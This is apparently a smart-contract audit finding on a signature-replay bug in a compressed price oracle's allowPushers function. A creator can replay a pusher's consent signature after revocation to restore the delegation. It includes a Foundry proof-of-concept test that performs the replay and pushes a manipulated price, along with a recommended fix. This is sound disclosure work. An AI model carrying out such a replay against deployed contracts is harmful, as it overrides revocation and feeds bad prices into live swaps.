### Title
Delegation Signature Never Consumed — Creator Can Replay `allowPushers` Signature to Re-Establish Revoked Delegation Within Deadline Window - (File: `smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` verifies a pusher's EIP-191 consent signature and checks a deadline, but **never marks the signature as used**. After a pusher calls `revokePusher()`, the creator can immediately replay the identical `(deadline, pusher, signature)` tuple to re-establish the delegation — an unlimited number of times until the deadline expires. The code comment explicitly acknowledges the deadline is the only guard against post-revocation replay, but the deadline only prevents replay *after* it expires, not *within* the window.

---

### Finding Description

`allowPushers` constructs a hash over `(block.chainid, address(this), deadline, pusher, msg.sender)` and verifies the pusher's signature against it:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
```

No nonce, no `usedSignatures` mapping, and no per-pusher revocation counter is ever written. The signature is structurally identical on every call as long as the deadline has not expired. After `revokePusher()` clears `namespaceRemapping[pusher]` to `address(0)`, the creator can call `allowPushers` again with the same bytes and the mapping is immediately restored to `msg.sender`.

The code's own NatSpec acknowledges the exact attack:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."*

The deadline is the stated mitigation, but it only closes the window after expiry. Within the window — which callers routinely set to hours or days — the revocation invariant is completely broken.

---

### Impact Explanation

The invariant "once a pusher revokes, the creator cannot re-establish delegation without fresh pusher consent" is broken for the entire deadline window. Concretely:

1. An automated price-feed operator (pusher) discovers the creator's namespace is wired to a pool executing live swaps.
2. The pusher calls `revokePusher()` to stop their data from routing to the creator's namespace.
3. The creator immediately replays the original `allowPushers` call with the same signature — `namespaceRemapping[pusher]` is restored to `creator`.
4. The pusher's automated system continues pushing into the creator's namespace; the pool continues consuming those prices.
5. Steps 2–4 repeat every block until the deadline expires.

The pusher's only escape is to halt their entire push infrastructure, which may be operationally impossible in the short term. During the window, the creator retains write authority over their namespace feeds, which flow through `AnchoredPriceProvider` into live pool swaps. This constitutes a delegation-cleanup failure that can sustain bad-price execution in pools backed by the creator's namespace.

---

### Likelihood Explanation

- **Trigger**: Any creator who holds a valid, unexpired pusher signature can replay it permissionlessly — no admin key, no special role.
- **Precondition**: The pusher must have previously signed a consent with a future deadline (standard operational practice).
- **Frequency**: The creator can replay in the same block as the pusher's revocation, making the revocation effectively unenforceable within the deadline window.
- **Deadline lengths**: Typical off-chain tooling sets deadlines of hours to days, giving the creator a large replay window.

---

### Recommendation

Record each consumed signature hash in a `mapping(bytes32 => bool) internal _usedDelegationSignatures` and revert if the hash has already been used:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(!_usedDelegationSignatures[hash], SignatureAlreadyUsed());
require(pusher == ECDSA.recover(hash, signatures[i]));
_usedDelegationSignatures[hash] = true;
namespaceRemapping[pusher] = msg.sender;
```

This ensures each signed consent can establish delegation exactly once, making `revokePusher()` final regardless of whether the deadline has expired.

### Proof of Concept

```solidity
function test_ReplayDelegationAfterRevoke() external {
    uint256 deadline = block.timestamp + 1 days;

    // Pusher signs consent once
    bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
    bytes memory sig = abi.encodePacked(r, s, v);

    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // Step 1: creator establishes delegation
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator, "delegated");

    // Step 2: pusher revokes
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

    // Step 3: creator replays the SAME signature — revocation is undone
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs); // should revert but does not
    assertEq(oracle.namespaceRemapping(pusher), creator,
        "FAIL: delegation re-established without fresh pusher consent");

    // Pusher's subsequent fallback pushes still land in creator's namespace
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 raw = _packRaw(9_000_000, 4, 2); // attacker-favourable price
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
    assertTrue(ok);
    assertEq(
        oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price,
        U64x32.decode(uint32(raw >> 16)),
        "bad price now live in creator namespace feeding pool swaps"
    );
}
```

**Expected (correct) output**: `allowPushers` reverts on the second call because the signature was already consumed.

**Actual output**: The second `allowPushers` succeeds, `namespaceRemapping[pusher]` is restored to `creator`, and the pusher's subsequent pushes continue to land in the creator's namespace — feeding the pool with prices the pusher intended to stop providing. [1](#0-0) [2](#0-1) [3](#0-2)

    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
